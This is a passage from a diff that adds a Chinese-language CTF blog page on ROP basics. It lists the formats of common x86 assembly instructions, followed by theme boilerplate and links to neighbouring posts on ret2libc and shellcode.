+<li>PUSH：压入堆栈指令，将 SRC 压入栈内，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">PUSH SRC;
+</code></pre>
+<ul>
+<li>POP：弹出堆栈指令，将栈顶的数据弹出并存至 DST，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">POP DST;
+</code></pre>
+<ul>
+<li>LEA：取地址指令，将 MEM 的地址存至 REG ，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">LEA REG, MEM;
+</code></pre>
+<ul>
+<li>ADD／SUB：加／减法指令，将运算结果存至 DST，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">ADD/SUB DST, SRC;
+</code></pre>
+<ul>
+<li>AND／OR／XOR：按位与／或／异或，将运算结果存至 DST ，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">AND/OR/XOR DST，SRC;
+</code></pre>
+<ul>
+<li>CALL：调用指令，将当前的 eip 压入栈顶，并将 PTR 存入 eip，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">CALL PTR;
+</code></pre>
+<ul>
+<li>RET：返回指令，操作为将栈顶数据弹出至 eip，格式为</li>
+</ul>
+<pre class=" language-lang-txt"><code class="language-lang-txt">RET;
+</code></pre>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script>
+            </div>
+            <hr/>
+
+            
+
+            <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+
+<div id="article-share">
+    
+    <div class="social-share" data-disabled="qzone" data-wechat-qrcode-helper="<p>微信里点“发现”->“扫一扫”二维码便可查看分享。</p>"></div>
+    
+</div>
+
+<script src="/libs/share/js/social-share.min.js"></script>
+
+            <div class="reprint">
+                <p>
+                    <span class="reprint-tip">
+                        <i class="fa fa-exclamation-circle"></i>&nbsp;&nbsp;转载请注明:
+                    </span>
+                    <a href="https://180CM55KG.github.io" class="b-link-green">F0und</a>
+                    <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
+                    <a href="/2020/02/18/ctf/pwn/pwn-rop/" class="b-link-green">Pwn基础----ROP</a>
+                </p>
+            </div>
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/02/18/ctf/pwn/pwn-re2libc/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/12.jpg" class="responsive-img" alt="Pwn基础----ret2libc">
+                        
+                        <span class="card-title">Pwn基础----ret2libc</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">Return2libc0x00 前言Ret2libc，故名思意，return to libc,在PWN中即：修改返回地址使其指向libc中的shell
+参考文章：https://www.freebuf.com/news/182894.htm</div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-17
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/18/ctf/pwn/pwn-shellcode/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="Pwn基础----shellcode">
+                        
+                        <span class="card-title">Pwn基础----shellcode</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary">Pwn学习   —— shellcode0x10 shellcode－－修改返回地址，让其指向溢出数据中的一段指令
+根据上面副标题的说明，要完成的任务包括：在溢出数据内包含一段攻击指令，用攻击指令的起始地址覆盖掉返回地址。攻击指令一般都是用</div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-17
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category" target="_blank">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf/" target="_blank">
+                        <span class="chip bg-color">ctf</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/" target="_blank">
+                        <span class="chip bg-color">pwn</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+</div>
+
+
+    </div>
+    <div class="col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="fa fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+    });
+</script>
+    
+
+</main>
+
+
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
+
+            
+                &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
+                <span class="white-color">29.4k</span>
+            
+
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/180CM55KG/" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fa fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:1845477611@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1845477611" class="tooltipped" data-tooltip="QQ联系我: 1845477611" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fa fa-rss"></i>
+    </a>
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
+
+
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+
+
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+
+
+</body>
+</html>
